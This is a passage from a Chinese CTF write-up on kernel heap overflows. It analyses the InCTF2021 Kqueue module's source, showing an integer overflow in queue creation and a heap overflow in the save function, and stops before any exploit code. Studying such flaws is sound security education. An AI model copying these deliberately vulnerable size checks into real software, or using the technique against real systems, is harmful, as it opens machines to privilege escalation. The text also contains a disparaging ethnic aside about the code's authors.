<h3 id="例题：强网杯2021线上赛-notebook-1"><a href="#例题：强网杯2021线上赛-notebook-1" class="headerlink" title="例题：强网杯2021线上赛 - notebook"></a>例题：强网杯2021线上赛 - notebook</h3><h1 id="0x08-Kernel-Heap-Heap-Overflow"><a href="#0x08-Kernel-Heap-Heap-Overflow" class="headerlink" title="0x08.Kernel Heap - Heap Overflow"></a>0x08.Kernel Heap - Heap Overflow</h1><p><strong>溢出</strong>（Overflow）向来都是最为经典、也是最为常见的一种漏洞，此前我们已经接触了位于内核栈上的溢出漏洞，接下来我们开始深入内核动态内存区上的溢出漏洞</p>
<h2 id="例题：InCTF2021-Kqueue"><a href="#例题：InCTF2021-Kqueue" class="headerlink" title="例题：InCTF2021 - Kqueue"></a>例题：InCTF2021 - Kqueue</h2><!--\*CTF2019 - hackme-->

<blockquote>
<p>据说 InCTF 国际赛为印度的“强网杯”…</p>
<p>原题下载地址在<a target="_blank" rel="noopener" href="https://github.com/teambi0s/InCTFi/tree/master/2021/Pwn/Kqueue">这里</a>，本篇 wp 参照了 <a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-269031.htm">Scupax0s 师傅的 WP</a></p>
<p>这道题的文件系统用 Buildroot 进行构建，<strong>登入用户名为 ctf，密码为 kqueue</strong>，笔者找了半天才在官方 GitHub 里的 Admin 中打远程用的脚本找到的这个信息…</p>
<p>还有个原因不明的问题，本地重打包后<strong>运行根目录下 init 时的 euid 为 1000</strong>，笔者只好拉一个别的 kernel pwn 的文件系统过来暂时顶用…</p>
</blockquote>
<h3 id="①-保护分析"><a href="#①-保护分析" class="headerlink" title="① 保护分析"></a>① 保护分析</h3><p>查看启动脚本，只开启了 kaslr 保护，没开 KPTI 也没开 smap&amp;smep，还是给了我们 ret2usr 的机会的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-built_in">exec</span> qemu-system-x86_64 \<br>    -cpu kvm64 \<br>    -m 512 \<br>    -nographic \<br>    -kernel <span class="hljs-string">&quot;bzImage&quot;</span> \<br>    -append <span class="hljs-string">&quot;console=ttyS0 panic=-1 pti=off kaslr quiet&quot;</span> \<br>    -monitor /dev/null \<br>    -initrd <span class="hljs-string">&quot;./rootfs.cpio&quot;</span> \<br>    -net user \<br>    -net nic<br></code></pre></td></tr></table></figure>

<h3 id="②-源码分析"><a href="#②-源码分析" class="headerlink" title="② 源码分析"></a>② 源码分析</h3><p>题目给出了源代码，免去了我们逆向的麻烦</p>
<blockquote>
<p>但有的时候给出源码反而会增大解题难度，比如说 *CTF2021 的 babygame <del>C++ PWN能不能爪巴</del></p>
</blockquote>
<p>在 <code>kqueue.h</code> 中只定义了一个 ioctl 函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">kqueue_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span>;<br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">kqueue_fops</span> =</span> &#123;.unlocked_ioctl = kqueue_ioctl&#125;;<br></code></pre></td></tr></table></figure>

<p>ioctl 的函数定义位于 <code>kqueue.c</code> 中，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> noinline <span class="hljs-type">long</span> <span class="hljs-title function_">kqueue_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span>&#123;<br><br>    <span class="hljs-type">long</span> result;<br><br>    <span class="hljs-type">request_t</span> request;<br><br>    mutex_lock(&amp;operations_lock);<br><br>    <span class="hljs-keyword">if</span> (copy_from_user((<span class="hljs-type">void</span> *)&amp;request, (<span class="hljs-type">void</span> *)arg, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">request_t</span>)))&#123;<br>        err(<span class="hljs-string">&quot;[-] copy_from_user failed&quot;</span>);<br>        <span class="hljs-keyword">goto</span> ret;<br>    &#125;<br><br>    <span class="hljs-keyword">switch</span>(cmd)&#123;<br>        <span class="hljs-keyword">case</span> CREATE_KQUEUE:<br>            result = create_kqueue(request);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> DELETE_KQUEUE:<br>            result = delete_kqueue(request);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> EDIT_KQUEUE:<br>            result = edit_kqueue(request);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> SAVE:<br>            result = save_kqueue_entries(request);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            result = INVALID;<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>ret: <br>    mutex_unlock(&amp;operations_lock);<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>我们要传入的结构体应当为 <code>request_t</code> 类型，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    <span class="hljs-type">uint32_t</span> max_entries;<br>    <span class="hljs-type">uint16_t</span> data_size;<br>    <span class="hljs-type">uint16_t</span> entry_idx;<br>    <span class="hljs-type">uint16_t</span> queue_idx;<br>    <span class="hljs-type">char</span>* data;<br>&#125;<span class="hljs-type">request_t</span>;<br></code></pre></td></tr></table></figure>

<p>在 ioctl 中定义了比较经典的增删改查操纵，下面逐个分析</p>
<h4 id="err"><a href="#err" class="headerlink" title="*err"></a><em>*err</em></h4><p>笔者发现在其定义的一系列函数当中都有一系列的检查，若检查不通过则会调用 <code>err</code> 函数，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">err</span><span class="hljs-params">(<span class="hljs-type">char</span>* msg)</span>&#123;<br>    printk(KERN_ALERT <span class="hljs-string">&quot;%s\n&quot;</span>,msg);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>也就是说<strong>所有的检查没有任何的实际意义，哪怕不通过检查也不会阻碍程序的运行</strong>，经笔者实测确乎如此</p>
<h4 id="create-kqueue"><a href="#create-kqueue" class="headerlink" title="create_kqueue"></a>create_kqueue</h4><p>主要是进行队列的创建，限制了队列数量与大小</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> noinline <span class="hljs-type">long</span> <span class="hljs-title function_">create_kqueue</span><span class="hljs-params">(<span class="hljs-type">request_t</span> request)</span>&#123;<br>    <span class="hljs-type">long</span> result = INVALID;<br><br>    <span class="hljs-keyword">if</span>(queueCount &gt; MAX_QUEUES)<br>        err(<span class="hljs-string">&quot;[-] Max queue count reached&quot;</span>);<br><br>    <span class="hljs-comment">/* You can&#x27;t ask for 0 queues , how meaningless */</span><br>    <span class="hljs-keyword">if</span>(request.max_entries&lt;<span class="hljs-number">1</span>)<br>        err(<span class="hljs-string">&quot;[-] kqueue entries should be greater than 0&quot;</span>);<br><br>    <span class="hljs-comment">/* Asking for too much is also not good */</span><br>    <span class="hljs-keyword">if</span>(request.data_size&gt;MAX_DATA_SIZE)<br>        err(<span class="hljs-string">&quot;[-] kqueue data size exceed&quot;</span>);<br><br>    <span class="hljs-comment">/* Initialize kqueue_entry structure */</span><br>    queue_entry *kqueue_entry;<br><br>    <span class="hljs-comment">/* Check if multiplication of 2 64 bit integers results in overflow */</span><br>    ull space = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(__builtin_umulll_overflow(<span class="hljs-keyword">sizeof</span>(queue_entry),(request.max_entries+<span class="hljs-number">1</span>),&amp;space) == <span class="hljs-literal">true</span>)<br>        err(<span class="hljs-string">&quot;[-] Integer overflow&quot;</span>);<br><br>    <span class="hljs-comment">/* Size is the size of queue structure + size of entry * request entries */</span><br>    ull queue_size = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(__builtin_saddll_overflow(<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">queue</span>),space,&amp;queue_size) == <span class="hljs-literal">true</span>)<br>        err(<span class="hljs-string">&quot;[-] Integer overflow&quot;</span>);<br><br>    <span class="hljs-comment">/* Total size should not exceed a certain limit */</span><br>    <span class="hljs-keyword">if</span>(queue_size&gt;<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">queue</span>) + <span class="hljs-number">0x10000</span>)<br>        err(<span class="hljs-string">&quot;[-] Max kqueue alloc limit reached&quot;</span>);<br><br>    <span class="hljs-comment">/* All checks done , now call kzalloc */</span><br>    <span class="hljs-built_in">queue</span> *<span class="hljs-built_in">queue</span> = validate((<span class="hljs-type">char</span> *)kmalloc(queue_size,GFP_KERNEL));<br><br>    <span class="hljs-comment">/* Main queue can also store data */</span><br>    <span class="hljs-built_in">queue</span>-&gt;data = validate((<span class="hljs-type">char</span> *)kmalloc(request.data_size,GFP_KERNEL));<br><br>    <span class="hljs-comment">/* Fill the remaining queue structure */</span><br>    <span class="hljs-built_in">queue</span>-&gt;data_size   = request.data_size;<br>    <span class="hljs-built_in">queue</span>-&gt;max_entries = request.max_entries;<br>    <span class="hljs-built_in">queue</span>-&gt;queue_size  = queue_size;<br><br>    <span class="hljs-comment">/* Get to the place from where memory has to be handled */</span><br>    kqueue_entry = (queue_entry *)((<span class="hljs-type">uint64_t</span>)(<span class="hljs-built_in">queue</span> + (<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">queue</span>)+<span class="hljs-number">1</span>)/<span class="hljs-number">8</span>));<br><br>    <span class="hljs-comment">/* Allocate all kqueue entries */</span><br>    queue_entry* current_entry = kqueue_entry;<br>    queue_entry* prev_entry = current_entry;<br><br>    <span class="hljs-type">uint32_t</span> i=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;request.max_entries+<span class="hljs-number">1</span>;i++)&#123;<br>        <span class="hljs-keyword">if</span>(i!=request.max_entries)<br>            prev_entry-&gt;next = <span class="hljs-literal">NULL</span>;<br>        current_entry-&gt;idx = i;<br>        current_entry-&gt;data = (<span class="hljs-type">char</span> *)(validate((<span class="hljs-type">char</span> *)kmalloc(request.data_size,GFP_KERNEL)));<br><br>        <span class="hljs-comment">/* Increment current_entry by size of queue_entry */</span><br>        current_entry += <span class="hljs-keyword">sizeof</span>(queue_entry)/<span class="hljs-number">16</span>;<br><br>        <span class="hljs-comment">/* Populate next pointer of the previous entry */</span><br>        prev_entry-&gt;next = current_entry;<br>        prev_entry = prev_entry-&gt;next;<br>    &#125;<br><br>    <span class="hljs-comment">/* Find an appropriate slot in kqueues */</span><br>    <span class="hljs-type">uint32_t</span> j = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;MAX_QUEUES;j++)&#123;<br>        <span class="hljs-keyword">if</span>(kqueues[j] == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(j&gt;MAX_QUEUES)<br>        err(<span class="hljs-string">&quot;[-] No kqueue slot left&quot;</span>);<br><br>    <span class="hljs-comment">/* Assign the newly created kqueue to the kqueues */</span><br>    kqueues[j] = <span class="hljs-built_in">queue</span>;<br>    queueCount++;<br>    result = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>其中一个 queue 结构体定义如下，大小为 0x18：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    <span class="hljs-type">uint16_t</span> data_size;<br>    <span class="hljs-type">uint64_t</span> queue_size; <span class="hljs-comment">/* This needs to handle larger numbers */</span><br>    <span class="hljs-type">uint32_t</span> max_entries;<br>    <span class="hljs-type">uint16_t</span> idx;<br>    <span class="hljs-type">char</span>* data;<br>&#125;<span class="hljs-built_in">queue</span>;<br></code></pre></td></tr></table></figure>

<p>我们有一个全局指针数组保存分配的 queue</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">queue</span> *kqueues[MAX_QUEUES] = &#123;(<span class="hljs-built_in">queue</span> *)<span class="hljs-literal">NULL</span>&#125;;<br></code></pre></td></tr></table></figure>

<p>在这里用到了 <a target="_blank" rel="noopener" href="https://gcc.gnu.org/onlinedocs/gcc/Integer-Overflow-Builtins.html">gcc 内置函数</a> <code>__builtin_umulll_overflow</code>，主要作用就是将前两个参数相乘给到第三个参数，发生溢出则返回 true，<code>__builtin_saddll_overflow</code> 与之类似不过是加法</p>
<p>那么这里虽然 queue 结构体的成员数量似乎是固定的，但是在 kmalloc 时传入的 size 为 <code>((request.max_entry + 1) * sizeof(queue_entry)) + sizeof(queue)</code>，其剩余的空间用作 queue_entry 结构体，定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">queue_entry</span>&#123;</span><br>    <span class="hljs-type">uint16_t</span> idx;<br>    <span class="hljs-type">char</span> *data;<br>    queue_entry *next;<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>在这里存在一个<strong>整型溢出漏洞</strong>：如果在 <code>__builtin_umulll_overflow(sizeof(queue_entry),(request.max_entries+1),&amp;space)</code> 中我们传入的 <code>request.max_entries</code> 为 <code>0xffffffff</code>，加一后变为0，此时便能通过检测，但 space 最终的结果为0，从而在后续进行 kmalloc 时便只分配了一个 queue 的大小，但是存放到 queue 的 max_entries 域的值为 <code>request.max_entries</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">queue</span>-&gt;data_size   = request.data_size;<br><span class="hljs-built_in">queue</span>-&gt;max_entries = request.max_entries;<br><span class="hljs-built_in">queue</span>-&gt;queue_size  = queue_size;<br></code></pre></td></tr></table></figure>

<p>这里有一个移动指针的代码看得笔者比较疑惑，因为在笔者看来可以直接写作 <code>(queue_entry *)(queue + 1)</code>，<del>不过阿三的代码懂的都懂</del></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">kqueue_entry = (queue_entry *)((<span class="hljs-type">uint64_t</span>)(<span class="hljs-built_in">queue</span> + (<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">queue</span>)+<span class="hljs-number">1</span>)/<span class="hljs-number">8</span>));<br></code></pre></td></tr></table></figure>

<p>在分配 queue-&gt;data 时给 kmalloc 传入的大小为 <code>request.data_size</code>，限制为 0x20</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">queue</span>-&gt;data = validate((<span class="hljs-type">char</span> *)kmalloc(request.data_size,GFP_KERNEL));<br></code></pre></td></tr></table></figure>

<p>接下来会为每一个 queue_entry 的 data 域都分配一块内存，大小为 <code>request.data_size</code>，且 queue_entry 从低地址向高地址连接成一个单向链表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">uint32_t</span> i=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;request.max_entries+<span class="hljs-number">1</span>;i++)&#123;<br>        <span class="hljs-keyword">if</span>(i!=request.max_entries)<br>            prev_entry-&gt;next = <span class="hljs-literal">NULL</span>;<br>        current_entry-&gt;idx = i;<br>        current_entry-&gt;data = (<span class="hljs-type">char</span> *)(validate((<span class="hljs-type">char</span> *)kmalloc(request.data_size,GFP_KERNEL)));<br><br>        <span class="hljs-comment">/* Increment current_entry by size of queue_entry */</span><br>        current_entry += <span class="hljs-keyword">sizeof</span>(queue_entry)/<span class="hljs-number">16</span>;<br><br>        <span class="hljs-comment">/* Populate next pointer of the previous entry */</span><br>        prev_entry-&gt;next = current_entry;<br>        prev_entry = prev_entry-&gt;next;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>在最后会在 kqueue 数组中找一个空的位置把分配的 queue 指针放进去</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">uint32_t</span> j = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;MAX_QUEUES;j++)&#123;<br>    <span class="hljs-keyword">if</span>(kqueues[j] == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(j&gt;MAX_QUEUES)<br>    err(<span class="hljs-string">&quot;[-] No kqueue slot left&quot;</span>);<br><br><span class="hljs-comment">/* Assign the newly created kqueue to the kqueues */</span><br>kqueues[j] = <span class="hljs-built_in">queue</span>;<br>queueCount++;<br>result = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">return</span> result;<br></code></pre></td></tr></table></figure>

<h4 id="delete-kqueue"><a href="#delete-kqueue" class="headerlink" title="delete_kqueue"></a>delete_kqueue</h4><p>常规的删除功能，不过这里有个 bug 是先释放后再清零，笔者认为会把 free object 的next 指针给清掉，有可能导致内存泄漏？</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> noinline <span class="hljs-type">long</span> <span class="hljs-title function_">delete_kqueue</span><span class="hljs-params">(<span class="hljs-type">request_t</span> request)</span>&#123;<br>    <span class="hljs-comment">/* Check for out of bounds requests */</span><br>    <span class="hljs-keyword">if</span>(request.queue_idx&gt;MAX_QUEUES)<br>        err(<span class="hljs-string">&quot;[-] Invalid idx&quot;</span>);<br><br>    <span class="hljs-comment">/* Check for existence of the request kqueue */</span><br>    <span class="hljs-built_in">queue</span> *<span class="hljs-built_in">queue</span> = kqueues[request.queue_idx];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">queue</span>)<br>        err(<span class="hljs-string">&quot;[-] Requested kqueue does not exist&quot;</span>);<br><br>    kfree(<span class="hljs-built_in">queue</span>);<br>    <span class="hljs-built_in">memset</span>(<span class="hljs-built_in">queue</span>,<span class="hljs-number">0</span>,<span class="hljs-built_in">queue</span>-&gt;queue_size);<br>    kqueues[request.queue_idx] = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="edit-kqueue"><a href="#edit-kqueue" class="headerlink" title="edit_kqueue"></a>edit_kqueue</h4><p>主要是从用户空间拷贝数据到指定 queue_entry-&gt;size，如果给的 entry_idx为 0 则拷到 queue-&gt;data</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> noinline <span class="hljs-type">long</span> <span class="hljs-title function_">edit_kqueue</span><span class="hljs-params">(<span class="hljs-type">request_t</span> request)</span>&#123;<br>    <span class="hljs-comment">/* Check the idx of the kqueue */</span><br>    <span class="hljs-keyword">if</span>(request.queue_idx &gt; MAX_QUEUES)<br>        err(<span class="hljs-string">&quot;[-] Invalid kqueue idx&quot;</span>);<br><br>    <span class="hljs-comment">/* Check if the kqueue exists at that idx */</span><br>    <span class="hljs-built_in">queue</span> *<span class="hljs-built_in">queue</span> = kqueues[request.queue_idx];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">queue</span>)<br>        err(<span class="hljs-string">&quot;[-] kqueue does not exist&quot;</span>);<br><br>    <span class="hljs-comment">/* Check the idx of the kqueue entry */</span><br>    <span class="hljs-keyword">if</span>(request.entry_idx &gt; <span class="hljs-built_in">queue</span>-&gt;max_entries)<br>        err(<span class="hljs-string">&quot;[-] Invalid kqueue entry_idx&quot;</span>);<br><br>    <span class="hljs-comment">/* Get to the kqueue entry memory */</span><br>    queue_entry *kqueue_entry = (queue_entry *)(<span class="hljs-built_in">queue</span> + (<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">queue</span>)+<span class="hljs-number">1</span>)/<span class="hljs-number">8</span>);<br><br>    <span class="hljs-comment">/* Check for the existence of the kqueue entry */</span><br>    exists = <span class="hljs-literal">false</span>;<br>    <span class="hljs-type">uint32_t</span> i=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;<span class="hljs-built_in">queue</span>-&gt;max_entries+<span class="hljs-number">1</span>;i++)&#123;<br><br>        <span class="hljs-comment">/* If kqueue entry found , do the necessary */</span><br>        <span class="hljs-keyword">if</span>(kqueue_entry &amp;&amp; request.data &amp;&amp; <span class="hljs-built_in">queue</span>-&gt;data_size)&#123;<br>            <span class="hljs-keyword">if</span>(kqueue_entry-&gt;idx == request.entry_idx)&#123;<br>                validate(<span class="hljs-built_in">memcpy</span>(kqueue_entry-&gt;data,request.data,<span class="hljs-built_in">queue</span>-&gt;data_size));<br>                exists = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        kqueue_entry = kqueue_entry-&gt;next;<br>    &#125;<br><br>    <span class="hljs-comment">/* What if the idx is 0, it means we have to update the main kqueue&#x27;s data */</span><br>    <span class="hljs-keyword">if</span>(request.entry_idx==<span class="hljs-number">0</span> &amp;&amp; kqueue_entry &amp;&amp; request.data &amp;&amp; <span class="hljs-built_in">queue</span>-&gt;data_size)&#123;<br>        validate(<span class="hljs-built_in">memcpy</span>(<span class="hljs-built_in">queue</span>-&gt;data,request.data,<span class="hljs-built_in">queue</span>-&gt;data_size));<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!exists)<br>        <span class="hljs-keyword">return</span> NOT_EXISTS;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br></code></pre></td></tr></table></figure>

<h4 id="save-kqueue-entries"><a href="#save-kqueue-entries" class="headerlink" title="save_kqueue_entries"></a>save_kqueue_entries</h4><p>这个功能主要是分配一块现有 <code>queue-&gt;queue_size</code> 大小的 object 然后把 queue-&gt;data 与其所有 queue_entries-&gt;data 的内容拷贝到上边，而其每次拷贝的字节数用的是我们传入的 <code>request.data_size</code> ，在这里很明显存在堆溢出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> noinline <span class="hljs-type">long</span> <span class="hljs-title function_">save_kqueue_entries</span><span class="hljs-params">(<span class="hljs-type">request_t</span> 